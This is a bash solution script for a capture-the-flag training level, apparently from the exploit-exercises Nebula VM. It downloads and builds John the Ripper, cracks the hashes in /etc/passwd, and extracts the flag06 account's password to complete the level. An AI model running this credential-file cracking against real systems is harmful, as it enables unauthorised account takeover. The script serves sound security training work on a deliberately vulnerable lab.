#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

TMP=$(mktemp -d)
registerTrap "rm -r $TMP" EXIT

# If this script fails to download check for a more recent version
JOHN_VERSION=john-1.8.0
JOHN_URL=http://www.openwall.com/john/j/$JOHN_VERSION.tar.xz
JOHN_DIR=$TMP/$JOHN_VERSION
echo "Downloading John the Ripper... (GET $JOHN_URL)"
wget $JOHN_URL -qO- | tar xvfJ - -C $TMP >/dev/null 2>&1
echo "Compiling John the Ripper..."
make clean linux-x86-sse2 -C $JOHN_DIR/src >/dev/null

$JOHN_DIR/run/john /etc/passwd >/dev/null 2>&1
TOKEN=$($JOHN_DIR/run/john --show /etc/passwd 2>/dev/null | grep flag06 | awk -F : '{print $2}')

exploit_with_token $TOKEN
